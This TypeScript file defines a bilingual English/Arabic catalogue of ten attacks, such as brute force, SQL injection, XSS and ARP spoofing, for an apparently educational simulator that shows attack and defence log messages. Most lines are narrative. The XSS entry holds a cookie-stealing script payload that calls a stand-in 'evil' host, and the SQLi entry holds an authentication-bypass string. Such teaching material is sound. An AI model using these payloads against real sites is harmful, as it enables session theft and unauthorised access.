// ============================================================================
// Title: Attack Catalog | كتالوج الهجمات
// Description (EN): Defines the 10 supported cyber attacks with bilingual metadata, protection mechanism names and explanations, and the ordered terminal-log phase scripts (each bilingual) for both the attack (protection OFF) and defense (protection ON) scenarios.
// الوصف (AR): يعرّف الهجمات السيبرانية العشرة المدعومة مع البيانات الوصفية ثنائية اللغة وأسماء آليات الحماية وتفسيراتها وسيناريوهات سجلات الطرفية المرتبة (ثنائية اللغة) لكل من سيناريو الهجوم (الحماية مغلقة) وسيناريو الدفاع (الحماية مفعّلة).
// ============================================================================

import type { AttackCatalogEntry } from "./types";

/* Title: Attack Catalog Entries | عناصر كتالوج الهجمات
   Description (EN): The full array of 10 attack definitions used by the simulator UI.
   الوصف (AR): المصفوفة الكاملة لتعريفات الهجمات العشرة المستخدمة في واجهة المحاكي.
*/
export const ATTACK_CATALOG: AttackCatalogEntry[] = [
  {
    id: "brute-force",
    nameEn: "Brute Force Attack",
    nameAr: "هجوم القوة الغاشمة",
    icon: "Hammer",
    shortDescEn: "Tries every possible password combination until one works.",
    shortDescAr: "يجرب كل تركيبة كلمات مرور ممكنة حتى تعمل واحدة.",
    protectionNameEn: "Account Lockout + Rate Limiting",
    protectionNameAr: "قفل الحساب + تحديد المعدل",
    protectionDescEn:
      "Locks the account after a few failed attempts and throttles login requests per IP, making exhaustive guessing impossible within any practical timeframe.",
    protectionDescAr:
      "يقفل الحساب بعد عدد محدود من المحاولات الفاشلة ويحد من طلبات تسجيل الدخول لكل عنوان IP، مما يجعل التخمين الشامل مستحيلاً ضمن أي إطار زمني عملي.",
    attackPhases: [
      { en: "Initializing brute-force engine against target login endpoint...", ar: "تهيئة محرك القوة الغاشمة ضد نقطة تسجيل الدخول المستهدفة..." },
      { en: "Attempting passwords: 0000, 1111, 1234, password, admin123...", ar: "تجربة كلمات المرور: 0000، 1111، 1234، password، admin123..." },
      { en: "Iteration 1,000 / 10,000 — no match yet...", ar: "التكرار 1,000 / 10,000 — لا تطابق بعد..." },
      { en: "Iteration 5,000 / 10,000 — no match yet...", ar: "التكرار 5,000 / 10,000 — لا تطابق بعد..." },
      { en: "Iteration 9,000 / 10,000 — no match yet...", ar: "التكرار 9,000 / 10,000 — لا تطابق بعد..." },
      { en: "Trying candidate: 'P@ssw0rd!' — hash matches!", ar: "تجربة المرشح: 'P@ssw0rd!' — التطابق ناجح!" },
    ],
    defensePhases: [
      { en: "Protection ACTIVE: Rate limiter engaged (5 attempts / minute / IP).", ar: "الحماية مفعّلة: محدد المعدل يعمل (5 محاولات / دقيقة / IP)." },
      { en: "Failed attempt #1 logged — counter incremented.", ar: "محاولة فاشلة #1 مسجّلة — تم زيادة العداد." },
      { en: "Failed attempt #3 logged — counter incremented.", ar: "محاولة فاشلة #3 مسجّلة — تم زيادة العداد." },
      { en: "Failed attempt #5 — ACCOUNT LOCKED for 15 minutes.", ar: "محاولة فاشلة #5 — تم قفل الحساب لمدة 15 دقيقة." },
      { en: "Subsequent attempts rejected with HTTP 429 Too Many Requests.", ar: "المحاولات اللاحقة مرفوضة برمز HTTP 429 طلبات كثيرة." },
      { en: "All brute-force attempts neutralized. No credentials compromised.", ar: "تم تحييد جميع محاولات القوة الغاشمة. لم تُخترق أي بيانات اعتماد." },
    ],
    successMessageEn: "BREACH SUCCESSFUL — valid credentials obtained via brute force.",
    successMessageAr: "تم الاختراق — تم الحصول على بيانات اعتماد صالحة عبر القوة الغاشمة.",
  },
  {
    id: "dictionary",
    nameEn: "Dictionary Attack",
    nameAr: "هجوم القاموس",
    icon: "BookOpen",
    shortDescEn: "Uses a curated wordlist of common passwords to guess credentials.",
    shortDescAr: "يستخدم قائمة كلمات مرور شائعة لتخمين بيانات الاعتماد.",
    protectionNameEn: "Password Complexity Policy + Dictionary Rejection",
    protectionNameAr: "سياسة تعقيد كلمات المرور + رفض القاموس",
    protectionDescEn:
      "Enforces minimum length and mixed-character rules and rejects any password found in known breach dictionaries, so dictionary words never match.",
    protectionDescAr:
      "يفرض قواعد الحد الأدنى للطول والخليط بين الأحرف ويرفض أي كلمة مرور موجودة في قواميس الاختراق المعروفة، لذا لن تتطابق كلمات القاموس أبدًا.",
    attackPhases: [
      { en: "Loading dictionary: rockyou.txt (14.3M entries)...", ar: "تحميل القاموس: rockyou.txt (14.3 مليون مدخل)..." },
      { en: "Testing: password, qwerty, letmein, monkey, dragon...", ar: "اختبار: password، qwerty، letmein، monkey، dragon..." },
      { en: "Dictionary index 50,000 — no match...", ar: "فهرس القاموس 50,000 — لا تطابق..." },
      { en: "Dictionary index 250,000 — no match...", ar: "فهرس القاموس 250,000 — لا تطابق..." },
      { en: "Testing: 'summer2024' — match found!", ar: "اختبار: 'summer2024' — تم العثور على تطابق!" },
    ],
    defensePhases: [
      { en: "Protection ACTIVE: Input screened against breach-corpus hash set.", ar: "الحماية مفعّلة: يُفحص الإدخال مقابل مجموعة تجزئة الاختراقات المعروفة." },
      { en: "'password' — REJECTED (in dictionary).", ar: "'password' — مرفوضة (موجودة في القاموس)." },
      { en: "'qwerty' — REJECTED (in dictionary).", ar: "'qwerty' — مرفوضة (موجودة في القاموس)." },
      { en: "'letmein' — REJECTED (in dictionary).", ar: "'letmein' — مرفوضة (موجودة في القاموس)." },
      { en: "All dictionary candidates rejected. User password not in corpus.", ar: "تم رفض جميع مرشحي القاموس. كلمة مرور المستخدم غير موجودة في المجموعة." },
    ],
    successMessageEn: "BREACH SUCCESSFUL — dictionary match found, account accessed.",
    successMessageAr: "تم الاختراق — تم العثور على تطابق في القاموس وتم الوصول للحساب.",
  },
  {
    id: "replay",
    nameEn: "Replay Attack",
    nameAr: "هجوم إعادة التشغيل",
    icon: "Repeat",
    shortDescEn: "Captures a valid request and re-sends it to impersonate the user.",
    shortDescAr: "يلتقط طلبًا صالحًا ويعيد إرساله لانتحال شخصية المستخدم.",
    protectionNameEn: "Nonce + Timestamp Window (Anti-Replay)",
    protectionNameAr: "الرقم العشوائي + نافذة الطابع الزمني (مضاد إعادة التشغيل)",
    protectionDescEn:
      "Each request carries a one-time nonce and a timestamp; the server rejects any request whose nonce was already seen or whose timestamp falls outside the allowed validity window.",
    protectionDescAr:
      "يحمل كل طلب رقمًا عشوائيًا لمرة واحدة وطابعًا زمنيًا؛ يرفض الخادم أي طلب تم رؤية رقمه العشوائي من قبل أو طابعه الزمني خارج نافذة الصلاحية المسموح بها.",
    attackPhases: [
      { en: "Sniffing network traffic — capturing authenticated request...", ar: "استنشاق حركة المرور — التقاط طلب مصدّق..." },
      { en: "Captured token: session=eyJhbGci... (copied to replay buffer).", ar: "رمز ملتقط: session=eyJhbGci... (نُسخ إلى ذاكرة الإعادة)." },
      { en: "Waiting 45s... replaying captured request verbatim...", ar: "انتظار 45 ثانية... إعادة إرسال الطلب الملتقط كما هو..." },
      { en: "Server accepted replayed token — request honored.", ar: "قبل الخادم الرمز المعاد — تم تنفيذ الطلب." },
    ],
    defensePhases: [
      { en: "Protection ACTIVE: Nonce cache + 60s timestamp window enforced.", ar: "الحماية مفعّلة: ذاكرة الرقم العشوائي + نافذة طابع زمني 60ث مفعّلة." },
      { en: "Incoming request nonce: 0x7F3A — first seen, accepted & cached.", ar: "الرقم العشوائي للطلب الوارد: 0x7F3A — أول مرة، مقبول ومخزّن." },
      { en: "Replayed request nonce: 0x7F3A — ALREADY CONSUMED.", ar: "الرقم العشوائي للطلب المعاد: 0x7F3A — مستهلك بالفعل." },
      { en: "Replay attempt REJECTED with HTTP 401 Unauthorized.", ar: "محاولة الإعادة مرفوضة برمز HTTP 401 غير مصرح." },
      { en: "Anti-replay defense held. Original session unaffected.", ar: "تمسّك دفاع مضاد الإعادة. الجلسة الأصلية لم تتأثر." },
    ],
    successMessageEn: "BREACH SUCCESSFUL — replayed request honored by server.",
    successMessageAr: "تم الاختراق — تم قبول الطلب المعاد من قبل الخادم.",
  },
  {
    id: "mitm",
    nameEn: "Man-in-the-Middle (MitM)",
    nameAr: "هجوم الوسيط (MitM)",
    icon: "Network",
    shortDescEn: "Intercepts and relays traffic between two parties who believe they talk directly.",
    shortDescAr: "يعترض ويعيد توجيه حركة المرور بين طرفين يعتقدان أنهما يتحدثان مباشرة.",
    protectionNameEn: "TLS Certificate Pinning + HSTS",
    protectionNameAr: "تثبيت شهادة TLS + HSTS",
    protectionDescEn:
      "Pins the expected server certificate public key and enforces HTTPS-only connections via HSTS, so any forged or intercepted certificate fails validation and the connection aborts.",
    protectionDescAr:
      "يثبت مفتاح الشهادة المتوقع للخادم ويفرض اتصالات HTTPS فقط عبر HSTS، مما يجعل أي شهادة مزيفة أو معترضة تفشل في التحقق ويتوقف الاتصال.",
    attackPhases: [
      { en: "ARP poisoning gateway — positioning as MITM...", ar: "تسميم ARP للبوابة — التموضع كوسيط..." },
      { en: "Downgrading HTTPS → HTTP via sslstrip...", ar: "تخفيض HTTPS → HTTP عبر sslstrip..." },
      { en: "Forwarding intercepted credentials in cleartext...", ar: "تمرير بيانات الاعتماد المعترضة بنص صريح..." },
      { en: "Victim session hijacked via intercepted tokens.", ar: "اختطاف جلسة الضحية عبر الرموز المعترضة." },
    ],
    defensePhases: [
      { en: "Protection ACTIVE: HSTS max-age=63072000; includeSubDomains.", ar: "الحماية مفعّلة: HSTS بمدة 63072000؛ تشمل النطاقات الفرعية." },
      { en: "Client detects certificate mismatch — pinned key absent.", ar: "العميل يكتشف عدم تطابق الشهادة — المفتاح المثبّت غائب." },
      { en: "TLS handshake ABORTED — connection refused.", ar: "تم إلغاء مصافحة TLS — رفض الاتصال." },
      { en: "sslstrip downgrade blocked by HSTS preload list.", ar: "تم حظر تخفيض sslstrip بواسطة قائمة HSTS المسبقة." },
      { en: "All intercepted traffic unreadable. MITM defeated.", ar: "كل حركة المرور المعترضة غير قابلة للقراءة. تم هزيمة الوسيط." },
    ],
    successMessageEn: "BREACH SUCCESSFUL — intercepted credentials in cleartext.",
    successMessageAr: "تم الاختراق — تم اعتراض بيانات الاعتماد بنص صريح.",
  },
  {
    id: "sqli",
    nameEn: "SQL Injection (SQLi)",
    nameAr: "حقن SQL (SQLi)",
    icon: "Database",
    shortDescEn: "Injects malicious SQL into input fields to manipulate the database.",
    shortDescAr: "يحقن SQL خبيثًا في حقول الإدخال للتحكم في قاعدة البيانات.",
    protectionNameEn: "Parameterized Queries + Input Sanitization",
    protectionNameAr: "الاستعلامات المُعاملة + تنظيف الإدخال",
    protectionDescEn:
      "Uses prepared statements with bound parameters so user input is treated strictly as data, never as executable SQL, and sanitizes/escapes all input by default.",
    protectionDescAr:
      "يستخدم الاستعلامات المُجهزة مع المعاملات المرتبطة بحيث يُعامل إدخال المستخدم كبيانات فقط وليس كـ SQL قابل للتنفيذ، وينظف/يهرب جميع الإدخالات افتراضيًا.",
    attackPhases: [
      { en: "Testing input field: ' OR '1'='1' -- ...", ar: "اختبار حقل الإدخال: ' OR '1'='1' -- ..." },
      { en: "Backend concatenates raw input into SQL string...", ar: "الخادم يدمج الإدخال الخام في سلسلة SQL..." },
      { en: "Query: SELECT * FROM users WHERE name='' OR '1'='1' -- '...", ar: "الاستعلام: SELECT * FROM users WHERE name='' OR '1'='1' -- '..." },
      { en: "Authentication bypassed — all rows returned. Admin access granted.", ar: "تم تجاوز المصادقة — أُرجعت كل الصفوف. مُنح وصول المسؤول." },
    ],
    defensePhases: [
      { en: "Protection ACTIVE: Parameterized prepared statements in use.", ar: "الحماية مفعّلة: الاستعلامات المُعاملة المُجهزة قيد الاستخدام." },
      { en: "Input ' OR '1'='1' -- bound as literal string parameter.", ar: "الإدخال ' OR '1'='1' -- مرتبط كمعامل سلسلة حرفي." },
      { en: "Database treats input as DATA, not SQL — no injection possible.", ar: "تعامل قاعدة البيانات الإدخال كبيانات لا كـ SQL — لا حقن ممكن." },
      { en: "Query returns zero unexpected rows. Authentication intact.", ar: "أرجع الاستعلام صفر صفوف غير متوقعة. المصادقة سليمة." },
    ],
    successMessageEn: "BREACH SUCCESSFUL — SQL injection bypassed authentication.",
    successMessageAr: "تم الاختراق — تجاوز حقن SQL مصادقة النظام.",
  },
  {
    id: "xss",
    nameEn: "Cross-Site Scripting (XSS)",
    nameAr: "البرمجة عبر المواقع (XSS)",
    icon: "Code",
    shortDescEn: "Injects malicious scripts into pages viewed by other users.",
    shortDescAr: "يحقن نصوصًا برمجية خبيثة في صفحات يراها مستخدمون آخرون.",
    protectionNameEn: "Output Encoding + Content Security Policy (CSP)",
    protectionNameAr: "ترميز المخرجات + سياسة أمان المحتوى (CSP)",
    protectionDescEn:
      "HTML-encodes all user-supplied content before rendering so tags become inert text, and a strict CSP blocks inline scripts and unauthorized script sources.",
    protectionDescAr:
      "يقوم بترميز HTML لكل المحتوى المقدم من المستخدم قبل العرض فتصبح الوسوم نصًا غير ضار، وتمنع سياسة CSP الصارمة النصوص البرمجية المضمّنة والمصادر غير المصرح بها.",
    attackPhases: [
      { en: "Injecting payload: <script>fetch('//evil/?c='+document.cookie)</script>...", ar: "حقن الحمولة: <script>fetch('//evil/?c='+document.cookie)</script>..." },
      { en: "Server stores payload without sanitization...", ar: "الخادم يخزّن الحمولة بدون تنظيف..." },
      { en: "Victim loads page — payload executes in their browser...", ar: "الضحية يحمّل الصفحة — تُنفّذ الحمولة في متصفحه..." },
      { en: "Session cookies exfiltrated to attacker server.", ar: "تم سحب ملفات تعريف الارتباط إلى خادم المهاجم." },
    ],
    defensePhases: [
      { en: "Protection ACTIVE: Output encoding + strict CSP enabled.", ar: "الحماية مفعّلة: ترميز المخرجات + CSP صارم مفعّل." },
      { en: "Payload HTML-escaped: &lt;script&gt;...&lt;/script&gt; — rendered as text.", ar: "ترميز الحمولة: &lt;script&gt;...&lt;/script&gt; — عُرضت كنص." },
      { en: "CSP: script-src 'self' — inline script BLOCKED.", ar: "CSP: script-src 'self' — النص البرمجي المضمّن محظور." },
      { en: "No script execution. No cookies exfiltrated. XSS neutralized.", ar: "لا تنفيذ برمجي. لا سحب لملفات الارتباط. تم تحييد XSS." },
    ],
    successMessageEn: "BREACH SUCCESSFUL — XSS payload executed, cookies stolen.",
    successMessageAr: "تم الاختراق — تم تنفيذ حمولة XSS وسرقة ملفات تعريف الارتباط.",
  },
  {
    id: "ddos",
    nameEn: "DDoS / DoS Attack",
    nameAr: "هجوم حجب الخدمة الموزع (DDoS)",
    icon: "Zap",
    shortDescEn: "Overwhelms the target with traffic until it can no longer serve legitimate users.",
    shortDescAr: "يغمر الهدف بحركة مرور حتى يصبح غير قادر على خدمة المستخدمين الشرعيين.",
    protectionNameEn: "Rate Limiting + WAF + Anycast Scrubbing",
    protectionNameAr: "تحديد المعدل + جدار حماية التطبيقات + التنقية عبر Anycast",
    protectionDescEn:
      "Distributes traffic across an Anycast scrubbing network, applies per-IP rate limits, and uses a WAF to drop malicious flood packets before they reach the origin server.",
    protectionDescAr:
      "يوزع حركة المرور عبر شبكة تنقية Anycast، ويطبق حدود معدل لكل IP، ويستخدم جدار حماية التطبيقات لإسقاط حزم الفيضان الخبيثة قبل وصولها للخادم الأصلي.",
    attackPhases: [
      { en: "Mobilizing 50,000-botnet flood: SYN + HTTP GET storm...", ar: "تعبئة فيضان 50,000 بوت: عاصفة SYN + HTTP GET..." },
      { en: "Origin server CPU spiking to 98%...", ar: "حمل معالج الخادم الأصلي يرتفع إلى 98%..." },
      { en: "Legitimate users timing out — service unavailable...", ar: "المستخدمون الشرعيون ينتهي وقتهم — الخدمة غير متاحة..." },
      { en: "Target infrastructure collapsed. DDoS successful.", ar: "انهيار البنية التحتية المستهدفة. نجح هجوم DDoS." },
    ],
    defensePhases: [
      { en: "Protection ACTIVE: Anycast scrubbing + WAF + rate limits online.", ar: "الحماية مفعّلة: تنقية Anycast + WAF + حدود المعدل تعمل." },
      { en: "SYN flood absorbed at edge — 1.2M pps dropped.", ar: "تم امتصاص فيضان SYN عند الحافة — 1.2 مليون حزة/ث مُسقطة." },
      { en: "Rate-limited offending IPs — 48,000 blocked automatically.", ar: "تحديد معدل IP المخالفة — 48,000 محظور تلقائيًا." },
      { en: "Legitimate traffic flows normally. Origin at 22% CPU.", ar: "حركة المرور الشرعية تسير طبيعيًا. الخادم الأصلي عند 22% حمل." },
    ],
    successMessageEn: "BREACH SUCCESSFUL — service taken offline by flood.",
    successMessageAr: "تم الاختراق — تم إسقاط الخدمة بسبب الفيضان.",
  },
  {
    id: "arp-spoofing",
    nameEn: "ARP Spoofing",
    nameAr: "انتحال ARP",
    icon: "Router",
    shortDescEn: "Sends forged ARP replies to link the attacker's MAC to the gateway IP.",
    shortDescAr: "يرسل ردود ARP مزيفة لربط عنوان MAC للمهاجم بعنوان البوابة.",
    protectionNameEn: "Dynamic ARP Inspection + Static ARP Binding",
    protectionNameAr: "فحص ARP الديناميكي + ربط ARP الثابت",
    protectionDescEn:
      "Switches validate ARP packets against the DHCP snooping binding table and drop any ARP reply whose MAC/IP pairing is inconsistent, preventing cache poisoning.",
    protectionDescAr:
      "تتحقق المحولات من حزم ARP مقابل جدول ربط الاستماع DHCP وتُسقط أي رد ARP لا يتطابق فيه زوج MAC/IP، مما يمنع تسميم الذاكرة المؤقتة.",
    attackPhases: [
      { en: "Sending gratuitous ARP: gateway IP → attacker MAC...", ar: "إرسال ARP مجاني: IP البوابة → MAC المهاجم..." },
      { en: "Victim ARP cache poisoned — traffic now routed via attacker...", ar: "تسميم ذاكرة ARP للضحية — حركة المرور تُوجّه عبر المهاجم..." },
      { en: "Intercepting victim traffic as transparent MITM...", ar: "اعتراض حركة مرور الضحية كوسيط شفاف..." },
      { en: "Credentials harvested from redirected stream.", ar: "حصاد بيانات الاعتماد من التدفق المعاد توجيهه." },
    ],
    defensePhases: [
      { en: "Protection ACTIVE: Dynamic ARP Inspection enabled on switch.", ar: "الحماية مفعّلة: فحص ARP الديناميكي مفعّل على المحول." },
      { en: "Forged ARP reply checked against DHCP snooping table.", ar: "رد ARP المزيف فُحص مقابل جدول استماع DHCP." },
      { en: "MAC/IP mismatch DETECTED — packet DROPPED at switch port.", ar: "اكتشاف عدم تطابق MAC/IP — أُسقطت الحزمة عند منفذ المحول." },
      { en: "Victim ARP cache remains correct. Spoofing failed.", ar: "ذاكرة ARP للضحية تبقى صحيحة. فشل الانتحال." },
    ],
    successMessageEn: "BREACH SUCCESSFUL — ARP cache poisoned, traffic intercepted.",
    successMessageAr: "تم الاختراق — تم تسميم ذاكرة ARP واعتراض حركة المرور.",
  },
  {
    id: "session-hijacking",
    nameEn: "Session Hijacking",
    nameAr: "اختطاف الجلسة",
    icon: "Link2",
    shortDescEn: "Steals a valid session token and uses it to impersonate the victim.",
    shortDescAr: "يسرق رمز جلسة صالحًا ويستخدمه لانتحال شخصية الضحية.",
    protectionNameEn: "Token Binding + Session Regeneration + HttpOnly/Secure Cookies",
    protectionNameAr: "ربط الرمز + إعادة توليد الجلسة + ملفات تعريف الارتباط HttpOnly/Secure",
    protectionDescEn:
      "Binds session tokens to the client's TLS channel, regenerates the session ID after login and privilege changes, and marks cookies HttpOnly + Secure so they cannot be stolen or replayed from another client.",
    protectionDescAr:
      "يربط رموز الجلسة بقناة TLS للعميل، ويعيد توليد معرف الجلسة بعد تسجيل الدخول وتغيير الصلاحيات، ويضع علامات HttpOnly + Secure على ملفات تعريف الارتباط بحيث لا يمكن سرقتها أو إعادة تشغيلها من عميل آخر.",
    attackPhases: [
      { en: "Sniffing for session cookies on shared Wi-Fi...", ar: "استنشاق ملفات تعريف ارتباط الجلسة على Wi-Fi مشترك..." },
      { en: "Captured cookie: JSESSIONID=A7F92B... (copied).", ar: "ملف ارتباط ملتقط: JSESSIONID=A7F92B... (نُسخ)." },
      { en: "Injecting stolen cookie into attacker browser...", ar: "حقن ملف الارتباط المسروق في متصفح المهاجم..." },
      { en: "Server honored stolen session — attacker now logged in as victim.", ar: "قبل الخادم الجلسة المسروقة — المهاجم مسجّل الآن كالضحية." },
    ],
    defensePhases: [
      { en: "Protection ACTIVE: Token bound to TLS channel + Secure/HttpOnly flags.", ar: "الحماية مفعّلة: الرمز مرتبط بقناة TLS + علامات Secure/HttpOnly." },
      { en: "Stolen cookie replayed from DIFFERENT TLS channel.", ar: "ملف الارتباط المسروق أُعيد من قناة TLS مختلفة." },
      { en: "Token binding validation FAILED — session invalidated.", ar: "فشل التحقق من ربط الرمز — أُبطلت الجلسة." },
      { en: "Victim notified. Hijack attempt blocked.", ar: "تم إخطار الضحية. حُظرت محاولة الاختطاف." },
    ],
    successMessageEn: "BREACH SUCCESSFUL — stolen session accepted, victim impersonated.",
    successMessageAr: "تم الاختراق — تم قبول الجلسة المسروقة وانتحال شخصية الضحية.",
  },
  {
    id: "credential-stuffing",
    nameEn: "Credential Stuffing",
    nameAr: "حشو بيانات الاعتماد",
    icon: "KeyRound",
    shortDescEn: "Reuses username/password pairs leaked from other breaches.",
    shortDescAr: "يعيد استخدام أزواج اسم المستخدم/كلمة المرور المسربة من اختراقات أخرى.",
    protectionNameEn: "MFA + Breach-Corpus Password Blocking + Bot Detection",
    protectionNameAr: "المصادقة متعددة العوامل + حظر كلمات المرور المسربة + كشف البوتات",
    protectionDescEn:
      "Requires a second authentication factor, blocks any password found in known breach corpora, and challenges automated login attempts with bot detection (CAPTCHA / device fingerprint), so reused credentials alone never grant access.",
    protectionDescAr:
      "يتطلب عامل مصادقة ثانيً، ويحظر أي كلمة مرور موجودة في قواعد بيانات الاختراقات المعروفة، ويتحدى محاولات تسجيل الدخول الآلية بكشف البوتات (CAPTCHA / بصمة الجهاز)، فإعادة استخدام بيانات الاعتماد وحدها لن تمنح الوصول أبدًا.",
    attackPhases: [
      { en: "Loading leaked credential set: 2.4M pairs from breach corpus...", ar: "تحميل مجموعة بيانات الاعتماد المسربة: 2.4 مليون زوج..." },
      { en: "Stuffing pair #1,000: alice@example.com : qwerty123...", ar: "حشو الزوج #1,000: alice@example.com : qwerty123..." },
      { en: "Stuffing pair #18,000: bob@mail.com : summer2021...", ar: "حشو الزوج #18,000: bob@mail.com : summer2021..." },
      { en: "Pair #31,204 MATCHED — login succeeded without MFA.", ar: "الزوج #31,204 مطابق — نجح تسجيل الدخول بدون مصادقة متعددة." },
    ],
    defensePhases: [
      { en: "Protection ACTIVE: MFA enforced + bot detection + breach-password block.", ar: "الحماية مفعّلة: مصادقة متعددة العوامل + كشف البوتات + حظر كلمات المرور المسربة." },
      { en: "Automated login flagged by device fingerprint — CAPTCHA issued.", ar: "تسجيل دخول آلي مُعلّم ببصمة الجهاز — صدر تحدي CAPTCHA." },
      { en: "Bot solver failed — request blocked at edge.", ar: "فشل حلال البوت — حُظر الطلب عند الحافة." },
      { en: "Even valid pairs require OTP. Credential stuffing defeated.", ar: "حتى الأزواج الصالحة تتطلب OTP. تم هزيمة حشو البيانات." },
    ],
    successMessageEn: "BREACH SUCCESSFUL — reused credentials granted access.",
    successMessageAr: "تم الاختراق — منحت بيانات الاعتماد المعاد استخدامها وصولاً.",
  },
];

/* Title: Get Attack by ID | الحصول على هجوم بالمعرّف
   Description (EN): Looks up a single catalog entry by its attack id.
   الوصف (AR): يبحث عن عنصر كتالوج واحد عبر معرّف الهجوم.
*/
export function getAttackById(id: string): AttackCatalogEntry | undefined {
  return ATTACK_CATALOG.find((a) => a.id === id);
}
